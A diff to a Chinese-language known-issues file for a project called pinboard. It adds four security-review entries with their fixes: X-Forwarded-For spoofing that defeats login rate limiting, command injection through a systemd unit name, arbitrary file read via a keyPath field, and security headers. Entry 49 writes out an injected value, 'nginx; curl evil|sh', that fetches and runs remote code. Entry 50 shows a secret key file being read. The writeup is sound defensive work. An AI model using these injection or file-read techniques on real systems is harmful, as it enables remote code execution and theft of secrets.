@@ -1,4 +1,4 @@
-# pinboard 已知问题与坑（47 条）
+# pinboard 已知问题与坑（51 条）
 
 > 2026-10-21 从 `AGENTS.md` 搬出来（那份文件逼近 DSH 工作区指令 65536 B 预算，超了会被整份丢弃）。
 > **编号是稳定契约**：`AGENTS.md` 的模块说明、`web/`、`server/` 注释里的「见坑 18」都指这里的第 18 条——**新增只能往后加，不要重排、不要插号**。
@@ -73,3 +73,11 @@
 
 
 47. **观测项从 socket 拿回来的 bean 是 camelCase，库里的列名才是 snake_case**（2026-10-26 做 06 风味探测时踩的）：fork 的库里列叫 `policy_json`，但 `getMonitorList` 推回来的 bean 只有 `policyJson`（`server/model/monitor.js` 的 toJSON 走 camelCase），拿 `'policy_json' in bean` 判定永远 false → 自家 fork 被判成 upstream，「立即观测」整段不渲染。同理 **Hono 按注册顺序匹配**：`/meta` 必须写在 `/:id` **之前**（`server/kuma/routes.ts`），否则 `meta` 会被当成 id。
+
+48. **反代后面取客户端 IP，要取 `X-Forwarded-For` 的最后一段**（2026-10-26 安全审查时发现的）：`server/auth/middleware.ts` 原来取第一段 `xff.split(',')[0]`，而 `docs/deploy.md:51` 推荐的 nginx 写法是 `$proxy_add_x_forwarded_for`——客户端自带的值排在**最前**，真实来源追加在最后。结果是攻击者每次换一个 `X-Forwarded-For` 就是一条新 IP，登录限流（同 IP 15 分钟 5 次）等于没有：实测连续 12 次错密码全是 401，一次 429 都没触发。改成 `pickClientIp()` 取最后一段后，同样的「伪造前段 + 真实后段」5 次就 429。**只有 `TRUST_PROXY=1` 才读这个头**，直连时用 socket 地址。
+
+49. **systemd 单元名会拼进 Kuma 的 `ssh_command`，必须卡字符集**（同一天）：`server/kuma/provision.ts` 的 `ssh_command: 'systemctl is-active ' + unit`，`unit` 来自「添加主机」的请求体，而 Kuma 在目标机上**按 shell 执行**这条命令 → `nginx; curl evil|sh` 就是远程命令执行。现在加 `const UNIT_RE = /^[A-Za-z0-9_.@:-]+$/`。凡是「把字符串拼给别处当命令跑」的地方，都按这个套路先卡白名单，别指望调用方自觉。
+
+50. **「读私钥」的接口天然就是任意文件读取**（同一天）：`server/metrics/routes.ts` 的 `readTemplates()` 拿请求体里的 `keyPath` 直接 `readFileSync(keyPath, 'utf8')`，实测 `keyPath: 'data/secret.key'` 能读出来（内容会进 Kuma 观测项的 `ssh_private_key`）。只靠登录挡不住（单用户也会误用、也可能被 CSRF 链上），加两条：**大小 ≤ 64 KB** + **内容必须匹配 `/-----BEGIN [A-Z0-9 ]*PRIVATE KEY-----/`**。
+
+51. **安全头只加半套，CSP 是故意留白的**（同一天）：`server/index.ts` 加了 `X-Content-Type-Options: nosniff`、`X-Frame-Options: DENY`、`Referrer-Policy: no-referrer`、`Permissions-Policy`、CSP 里的 `frame-ancestors 'none'; base-uri 'self'`，`isHttps()` 为真时再加 HSTS。**别加完整 CSP**：nginx 子路径部署靠 `sub_filter` 往 `<head>` 注入 `<script>window.__PB_BASE__</script>`（见 `web/lib/base.ts`），邮件阅读器里用户点「加载图片」也是直接把 `src` 改到远端——`script-src 'self'` / `img-src 'self'` 会同时干掉这两件事。真要上完整 CSP，得先把注入脚本改成 nonce 或独立文件。
